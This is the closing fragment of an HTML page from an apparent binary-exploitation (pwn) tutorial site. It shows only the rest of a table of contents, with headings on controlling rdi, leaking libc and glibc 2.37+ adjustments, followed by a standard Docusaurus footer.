href="#detecting-this-behaviour" class="table-of-contents__link toc-highlight">Detecting this behaviour</a></li></ul></li><li><a href="#exploit-techniques" class="table-of-contents__link toc-highlight">Exploit techniques</a><ul><li><a href="#controlling-rdi" class="table-of-contents__link toc-highlight">Controlling <code>rdi</code></a></li><li><a href="#leaking-libc" class="table-of-contents__link toc-highlight">Leaking libc</a></li><li><a href="#adjusting-for-237" class="table-of-contents__link toc-highlight">Adjusting for 2.37+</a></li></ul></li><li><a href="#what-if-rdi--_io_stdfile_0_lock" class="table-of-contents__link toc-highlight">What if <code>rdi != _IO_stdfile_0_lock</code>?</a><ul><li><a href="#case-1-rdi-is-writable" class="table-of-contents__link toc-highlight">Case 1: <code>rdi</code> is writable</a></li><li><a href="#case-2-rdi-is-readable" class="table-of-contents__link toc-highlight">Case 2: <code>rdi</code> is readable</a></li><li><a href="#case-3-rdi--null" class="table-of-contents__link toc-highlight">Case 3: <code>rdi == NULL</code></a></li><li><a href="#case-4-rdi-is-junk" class="table-of-contents__link toc-highlight">Case 4: <code>rdi</code> is junk</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/pwn/">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>